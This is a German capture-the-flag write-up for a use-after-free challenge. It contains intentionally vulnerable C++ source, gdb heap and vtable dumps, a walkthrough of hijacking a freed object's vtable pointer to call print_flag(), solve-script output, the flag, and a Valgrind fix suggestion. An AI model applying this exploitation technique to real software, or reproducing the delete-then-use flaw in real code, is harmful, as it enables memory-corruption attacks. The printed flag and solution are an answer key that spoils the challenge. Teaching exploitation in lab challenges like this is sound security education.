# pwn-useafterfree

## Lösungsvorschlag

### Grundproblem

Der Name der Challenge deutet an, worum es geht: Eine Useafterfree-Schwachstelle.

In Kombination mit einem ersten Blick auf den Source Code scheint das Problem hier zu sein, dass
Variablen bzw. Objekte gelöscht werden (`delete bus;`). Auf diese Variablen wird jedoch in einzelnen Code-Blöcken zugegriffen, ohne das geprüft wird, ob diese noch existieren (`bus->print_stats();`). Einzlene lokale Daten werden auch auf den Heap gespeichert (`data = new char[len_stdin];`).

```cpp
#include <fcntl.h>
#include <iostream>
#include <unistd.h>
#include <cstring>
#include <cstdlib>
using namespace std;

class Vehicle{
private:
        virtual void print_flag(){
                char* args[3] = {"/bin/cat", "./flag.txt", NULL};
                execve(args[0], args, NULL);
        }
protected:
        int seats;
        string color;
public:
        virtual void print_stats(){
                cout << "Meine Farbe ist " << color << " und ich habe " << seats << " Sitzplaetze." << endl;
                cout << "-----------------------------------------------" << endl;
        }
};

class Bus: public Vehicle{
public:
        Bus(string color, int seats){
                this->color = color;
                this->seats = seats;
        }
        virtual void print_stats(){
                cout << "Ich bin ein Bus." << endl;
                Vehicle::print_stats();
        }
};

class LKW: public Vehicle{
public:
        LKW(string color, int seats){
                this->color = color;
                this->seats = seats;
        }
        virtual void print_stats(){
                cout << "Ich bin ein LKW." << endl;
                Vehicle::print_stats();
        }
};

int main(int argc, char* argv[]){
        Vehicle* bus = new Bus("blau", 35);
        Vehicle* lkw = new LKW("silber", 2);

        size_t len;
        char* data;
        unsigned int op;
        unsigned int len_stdin;
        while(1){
                cout << "1. Allokieren\n2. Ausgeben\n3. Loeschen\n";
                cin >> op;

                if(op == 1){
                        //Ich bin ein cpp Experte!
                        cin >> len_stdin;
                        data = new char[len_stdin];
                        read(STDIN_FILENO, data, len_stdin);
                        cout << "Daten allokiert" << endl;
                } else if(op == 2){
                        bus->print_stats();
                        lkw->print_stats();
                        delete lkw;
                } else if (op == 3){
                        delete bus;
                        delete lkw;
                        cout << "Fahrzeuge geloescht" << endl;
                }
        }

        return 0;
}
```

Das Ziel ist es die Flag auszugeben, was über die Funktion `print_flag()` möglich ist.
Ein wichtiges Keyword ist `virtual`. Eine solche Funktion kann von neu abgeleiteten Funktionen neu definiert werden.
Weitere Informationen zu vtables und Virtual Functions gibt es zum Beispiel unten[^1].

### Exploitation

Ein erster Test, bei dem die Objekte gelöscht werden und anschließend auf diese zugegriffen wird, führt erwartungsgemäß zu einem Segmentation Fault.

```bash
$ ./ich_mag_busse                                                           
1. Allokieren
2. Ausgeben
3. Loeschen
3
Fahrzeuge geloescht
1. Allokieren
2. Ausgeben
3. Loeschen
2
zsh: segmentation fault  ./ich_mag_busse
```

Eine Übersicht der ermittelten `vtables` in `gdb` nach der Allokation der Objekte (`1` als Auswahl):

```
gef➤  heap chunks
Chunk(addr=0x405010, size=0x290, flags=PREV_INUSE)
    [0x0000000000405010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x4052a0, size=0x11c10, flags=PREV_INUSE)
    [0x00000000004052a0     00 1c 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x416eb0, size=0x40, flags=PREV_INUSE)
    [0x0000000000416eb0     80 3d 40 00 00 00 00 00 23 00 00 00 00 00 00 00    .=@.....#.......]
Chunk(addr=0x416ef0, size=0x40, flags=PREV_INUSE)
    [0x0000000000416ef0     60 3d 40 00 00 00 00 00 02 00 00 00 00 00 00 00    `=@.............]
Chunk(addr=0x416f30, size=0xf0e0, flags=PREV_INUSE)
    [0x0000000000416f30     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x416f30, size=0xf0e0, flags=PREV_INUSE)  ←  top chunk

gef➤  x/10x 0x416eb0
0x416eb0:       0x0000000000403d80      0x0000000000000023
0x416ec0:       0x0000000000416ed0      0x0000000000000004
0x416ed0:       0x0000000075616c62      0x0000000000000000
0x416ee0:       0x0000000000000000      0x0000000000000041
0x416ef0:       0x0000000000403d60      0x0000000000000002

gef➤ x/14xg 0x0000000000403d50
0x403d50 <vtable for LKW>:      0x0000000000000000      0x0000000000403db0
0x403d60 <vtable for LKW+16>:   0x0000000000401578      0x00000000004017ea
0x403d70 <vtable for Bus>:      0x0000000000000000      0x0000000000403dc8
0x403d80 <vtable for Bus+16>:   0x0000000000401578      0x0000000000401734
0x403d90 <vtable for Vehicle>:  0x0000000000000000      0x0000000000403de0
0x403da0 <vtable for Vehicle+16>:       0x0000000000401578      0x00000000004015be
```

Hier sind die Pointer auf die Funktionen zu erkennen:

```
gef➤  disass 0x0000000000401578
Dump of assembler code for function Vehicle::print_flag():
   0x0000000000401578 <+0>:     push   rbp
disass 0x00000000004017ea
Dump of assembler code for function LKW::print_stats():
   0x00000000004017ea <+0>:     push   rbp
disass 0x0000000000401734
Dump of assembler code for function Bus::print_stats():
   0x0000000000401734 <+0>:     push   rbp
```

Wird nun die Option Löschen gewählt, wird der Pointer auf die vtable gelöscht. Der Inhalt der vtable bleibt jedoch erhalten:

```
gef➤  x/10x 0x416eb0
0x416eb0:       0x0000000000000416      0x0000000000405010
0x416ec0:       0x0000000000416ed0      0x0000000000000004
0x416ed0:       0x0000000075616c62      0x0000000000000000
0x416ee0:       0x0000000000000000      0x0000000000000041
0x416ef0:       0x0000000000416aa6      0x0000000000405010
gef➤  x/14xg 0x0000000000403d50
0x403d50 <vtable for LKW>:      0x0000000000000000      0x0000000000403db0
0x403d60 <vtable for LKW+16>:   0x0000000000401578      0x00000000004017ea
0x403d70 <vtable for Bus>:      0x0000000000000000      0x0000000000403dc8
0x403d80 <vtable for Bus+16>:   0x0000000000401578      0x0000000000401734
0x403d90 <vtable for Vehicle>:  0x0000000000000000      0x0000000000403de0
0x403da0 <vtable for Vehicle+16>:       0x0000000000401578      0x00000000004015be
0x403db0 <typeinfo for LKW>:    0x00007ffff7fa2c70      0x00000000004020fb
```

Die eigentliche Exploitation ist nun, dass `data = new char[len_stdin];` auf den Heap geschrieben wird.
Hier kann angesetzt werden, indem die Zieladresse auf `0x0000000000403d80 - 0x8 = 0x0000000000403d78` gesetzt wird. So wird aufgrund des Offsets in der vtable von `0x8` anschließend die Funktion an der Adresse `0x0000000000401578` aufgerufen. Dies ist die Adresse von `print_flag()`.

```
0x403db0 <_ZTI3LKW>:    0x00007ffff7fa2c70      0x00000000004020fb
gef➤  x/4xg 0x0000000000403d78
0x403d78 <_ZTV3Bus+8>:  0x0000000000403dc8      0x0000000000401578
0x403d88 <_ZTV3Bus+24>: 0x0000000000401734      0x0000000000000000
gef➤  x/4xg 0x0000000000401578
0x401578 <_ZN7Vehicle10print_flagEv>:   0x30ec8348e5894855      0x7e058d48d87d8948
0x401588 <_ZN7Vehicle10print_flagEv+16>:        0x48e045894800000a      0x894800000a7c058d
```

Die Heapgröße ist 0x30 (48) Byte. Die geschriebene Adresse `0x0000000000403d78` ist 8 Byte groß. Entsprechend wird ein Padding von 40 Byte benötigt.

Die Lösung mittels des Skriptes [`solve.py`](./solve.py):

```
python ./solve.py
Verbinden zu localhost:54321...
[+] Opening connection to localhost on port 54321: Done
b'1. Allokieren\n2. Ausgeben\n3. Loeschen\n'
Sende 3...
b'Fahrzeuge geloescht\n1. Allokieren\n2. Ausgeben\n3. Loeschen\n'
Sende 1...
Senden der Laenge des Inputs...
Senden der payload...
b'Daten allokiert\n1. Allokieren\n2. Ausgeben\n3. Loeschen\n'
Sende 1...
Senden der Laenge des Inputs...
Senden der payload...
b'Daten allokiert\n1. Allokieren\n2. Ausgeben\n3. Loeschen\n'
Sende 2...
b'DBH{j3d3r_m46_bu553}'
[*] Closed connection to localhost port 54321
```

## Beseitigung der Schwachstelle

Eine Lösungsmöglichkeit wäre hier während der Entwicklung Memory Error Detections wie Valgrind[^2] zu verwenden, um solche Fehler frühzeitig zu erkennen.

## Flag
```
DBH{j3d3r_m46_bu553}
```

## Basierend auf / Inspiriert von

Diese Challenge ist keine direkte Eigenentwicklung sondern basiert auf einem frei zugänglichen Write-Up[^3] zu einer Challenge der Plattform pwnable.kr[^4].  Dort ist eine große Sammlung von pwn-Challenges zu finden.

[^1]: github.io [https://pabloariasal.github.io/2017/06/10/understanding-virtual-tables/](https://pabloariasal.github.io/2017/06/10/understanding-virtual-tables/)

[^2]: valgrind.org: [https://valgrind.org/](https://valgrind.org/)

[^3]: medium.com: [https://corruptedprotocol.medium.com/uaf-writeup-pwnable-use-after-free-862dec0377ae](https://corruptedprotocol.medium.com/uaf-writeup-pwnable-use-after-free-862dec0377ae)

[^4]: pwnable.kr: [https://pwnable.kr](https://pwnable.kr/)
